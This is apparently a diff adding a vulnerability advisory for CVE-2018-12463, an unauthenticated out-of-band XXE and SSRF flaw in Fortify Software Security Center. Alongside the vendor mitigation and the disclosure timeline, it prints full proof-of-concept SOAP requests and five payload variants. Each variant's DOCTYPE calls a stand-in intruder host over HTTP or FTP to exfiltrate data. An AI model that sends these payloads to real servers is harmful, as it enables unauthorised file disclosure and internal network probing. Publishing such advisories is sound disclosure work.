@@ -1,0 +1,208 @@
+Details
+================
+Software: Fortify SSC (Software Security Center) 
+Version: 17.10, 17.20 & 18.10
+Homepage: https://www.microfocus.com
+Advisory report: https://github.com/alt3kx/CVE-2018-12463
+CVE: CVE-2018-12463 at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12463
+CVSS: HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)
+CWE-611, CWE-918
+
+Description
+================
+Out-of-Band XML External Entity (OOB-XXE) An XML External Entity attack is a type of attack against an application that parses XML input. 
+
+This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of
+confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.
+
+Vulnerability
+================
+XML external entity (XXE) vulnerability in /ssc/fm-ws/services in Fortify Software Security Center (SSC) 17.10, 17.20 & 18.10 allows remote unauthenticated users to read arbitrary
+files or conduct server-side request forgery (SSRF) attacks via a crafted DTD in an XML request.
+
+Proof of concept Exploit
+==========================
+
+The offending POST method below:
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8; text/html;
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1765
+
+<?xml version='1.0' encoding='UTF-8'?>
+<!Your payload here "http://intuder.IP.here/alex1.dtd"> <-- HERE!!! 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" soapenv:mustUnderstand="1">
+      <wsu:Timestamp xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" wsu:Id="Timestamp-2">
+        <wsu:Created>2018-05-24T14:27:02.619Z</wsu:Created>
+        <wsu:Expires>2018-05-24T14:32:02.619Z</wsu:Expires>
+      </wsu:Timestamp>
+      <wsse:UsernameToken xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" wsu:Id="UsernameToken-1">
+        <wsse:Username>XXXXXXX</wsse:Username>
+        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">XXXXXXXXXXX</wsse:Password>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </soapenv:Header>
+  <soapenv:Body>
+    <ns3:GetAuthenticationTokenRequest xmlns:ns3="http://www.fortify.com/schema/fws" xmlns:ns6="xmlns://www.fortify.com/schema/issuemanagement" 
+xmlns:ns5="xmlns://www.fortifysoftware.com/schema/activitytemplate" xmlns:ns8="xmlns://www.fortifysoftware.com/schema/seed" 
+xmlns:ns7="xmlns://www.fortifysoftware.com/schema/runtime" 
+xmlns:ns9="xmlns://www.fortify.com/schema/attachments" 
+xmlns:ns2="xmlns://www.fortify.com/schema/audit" 
+xmlns:ns4="xmlns://www.fortifysoftware.com/schema/wsTypes" 
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+      <ns3:TokenType>AnalysisUploadToken</ns3:TokenType>
+    </ns3:GetAuthenticationTokenRequest>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+Note: As remark that is not necessary to be used the credentials or any authentication, the POST method above was extracted using Burp Suite to know the 
+exact API path and data sending to the server.
+
+RedTeam Vector (1): Using “Transitional” payload, connection to HTTP server (intruder). it works!
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8; text/html;
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1789
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://intruder.ip.here/alex1.dtd">
+
+[../snip]
+
+RedTeam Vector (2): Classic "OOB XXE" payload, connection to HTTP server (intruder), it works!
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1750
+
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE data SYSTEM "http://intruder.ip.here/alex1.dtd">
+<data>&send;</data>
+
+[../snip]
+
+
+RedTeam Vector (3): FTP payload with ruby FTP server emulator
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1769
+
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE data SYSTEM "ftp://intruder.ip.here:2121">
+
+[../snip]
+
+
+RedTeam Vector (4): FTP payloads with FTP python server
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1769
+
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE data SYSTEM "ftp://intruder.ip.here:2121">
+
+[../snip]
+
+
+RedTeam Vector (5): FTP payload, server compromised
+
+POST /ssc/fm-ws/services HTTP/1.1
+Accept-Encoding: gzip, deflate
+SOAPAction: ""
+Accept: text/xml
+Content-Type: text/xml; charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_121
+Host: fortifyserver.com
+Connection: close
+Content-Length: 1769
+
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE data SYSTEM "ftp://anonymous:anonymous@intruder.ip.here:2121/alex1.txt">
+
+[../snip]
+
+
+Mitigations
+================
+Provided by the vendor here:
+
+Document ID: KM03201563
+https://softwaresupport.softwaregrp.com/document/-/facetsearch/document/KM03201563
+
+Disclosure policy
+================
+We believes in responsible disclosure.
+Please contact us on Alex Hernandez aka alt3kx () protonmail com to acknowledge this report. 
+
+This vulnerability will be published if we do not receive a response to this report with 10 days.
+
+Timeline
+================
+
+2018-05-24: Discovered
+2018-05-25: Retest PRO environment
+2018-05-31: Vendor notification, two issues found 
+2018-05-31: Vendor feedback received 
+2018-06-01: Internal communication
+2018-06-01: Vendor feedback, two issues are confirmed
+2018-06-05: Vendor notification, new issue found
+2018-06-06: Vendor feedback, evaluating High submission
+2018-06-08: Vendor feedback, High issue is confirmed
+2018-06-19: Researcher, reminder sent
+2018-06-22: Vendor feedback, summary of CVEs handled as official way
+2018-06-26: Vendor feedback, official Hotfix for High issue available to test
+2018-06-29: Researcher feedback
+2018-07-02: Researcher feedback
+2018-07-04: Researcher feedback, Hotfix tested on QA environment
+2018-07-05: Vendor feedback
+2018-07-09: Vendor feedback, final details to disclosure the CVE and official Hotfix availabe for customers.
+2018-07-09: Vendor feedback, CVE and official Hotfix to be disclosure
+2018-07-12: Agreements with the vendor to publish the CVE/Advisory. 
+2018-07-12: Public report
